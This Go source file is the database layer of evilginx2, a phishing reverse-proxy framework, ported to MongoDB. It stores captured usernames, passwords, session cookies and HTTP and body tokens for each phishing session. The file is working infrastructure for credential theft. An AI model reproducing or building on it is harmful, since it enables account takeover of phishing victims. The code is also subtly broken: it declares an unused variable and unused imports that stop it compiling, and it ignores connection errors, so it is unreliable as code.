package database

import (
	"context"
	"encoding/json"
	"strconv"
	"time"

	"go.mongodb.org/mongo-driver/mongo"
	"go.mongodb.org/mongo-driver/mongo/options"
)

type Database struct {
	path string
	db   *mongo.Database
}

func NewDatabase(path string) (*Database, error) {
	var err error
	d := &Database{
		path: path,
	}

	ctx, _ := context.WithTimeout(context.Background(), 10*time.Second)
	client, _ := mongo.Connect(ctx, options.Client().ApplyURI("mongodb://localhost:27017"))
	d.db = client.Database("evilginx2")

	d.sessionsInit()

	return d, nil
}

func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
	_, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
	return err
}

func (d *Database) ListSessions() ([]*Session, error) {
	s, err := d.sessionsList()
	return s, err
}

func (d *Database) SetSessionUsername(sid string, username string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Username = username
	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) SetSessionPassword(sid string, password string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Password = password
	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) SetSessionCustom(sid string, name string, value string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Custom[name] = value
	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) SetSessionBodyTokens(sid string, tokens map[string]string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.BodyTokens = tokens
	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) SetSessionHttpTokens(sid string, tokens map[string]string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.HttpTokens = tokens
	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.CookieTokens = tokens
	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) DeleteSession(sid string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	err = d.sessionsDelete(s.Id)
	return err
}

func (d *Database) DeleteSessionById(id int) error {
	_, err := d.sessionsGetById(id)
	if err != nil {
		return err
	}
	err = d.sessionsDelete(id)
	return err
}

func (d *Database) Flush() {
	// No equivalent operation in MongoDB
}
